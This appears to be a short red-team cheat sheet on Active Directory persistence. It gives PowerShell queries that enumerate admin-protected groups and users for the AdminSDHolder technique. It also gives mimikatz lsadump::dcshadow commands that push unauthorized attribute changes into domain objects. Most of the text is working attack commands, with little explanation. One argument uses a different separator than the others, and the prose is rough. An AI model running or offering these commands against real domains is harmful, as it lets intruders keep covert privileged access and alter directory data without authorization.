### AdminSDHolder Persistence
AdminSDHolder is a container that exists in each AD domain and A protected group is a group that is identified as privileged. This group and all its
members should be protected from unintentional modifications


```
Get-ADGroup -LDAPFilter "(admincount=1)" -Server 192.168.100.10 -Credential "Insomnia\MeMe" | Select SamAccountName

Get-ADUser -LDAPFilter "(admincount=1)" -Server 192.168.100.100 -Credential "Insomnia\MeMe" | Select SamAccountName
```

###  DCShadow Persistence

DCShadow is persistence technique used by adversary that allow  an adversary to push unauthorized changes into the environment by modifying active directory objects. to carry out such a persistence technique two active administrative session is required.one of which has to be domain privilege session and one of another session has to be system privilege session where compromised box.
```
!processtoken
lsadump::dcshadow /object:MeMe /attribute:url /value:acmebank.local
lsadump::dcshadow /push

lsadump::dcshadow /object:John-PC$ /attribute:badpwdcount /value=7777
lsadump::dcshadow /push

```
